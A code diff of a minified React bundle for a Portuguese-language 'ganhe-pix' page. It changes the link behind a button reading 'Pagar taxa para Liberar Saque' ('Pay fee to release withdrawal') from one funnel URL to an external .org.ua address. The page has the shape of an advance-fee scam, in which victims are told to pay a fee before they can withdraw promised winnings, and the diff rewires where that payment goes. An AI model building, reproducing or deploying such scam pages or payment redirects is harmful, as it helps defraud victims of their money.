@@ -27056,7 +27056,7 @@ const FC = "/assets/ganhe-pix-logo-DjUMhWJR.webp"
                     className: "w-full py-6 bg-success hover:bg-success/90 text-white font-semibold",
                     asChild: !0,
                     children: y.jsx("a", {
-                        href: "https://funilganhar.vercel.app",
+                        href: "https://ambienteseguro.org.ua/c/c1766c78fe",
                         target: "_blank",
                         rel: "noopener noreferrer",
                         children: "Pagar taxa para Liberar Saque"
@@ -27358,4 +27358,5 @@ const FC = "/assets/ganhe-pix-logo-DjUMhWJR.webp"
     })
 });
 J0(document.getElementById("root")).render(y.jsx(IL, {}));
+
 
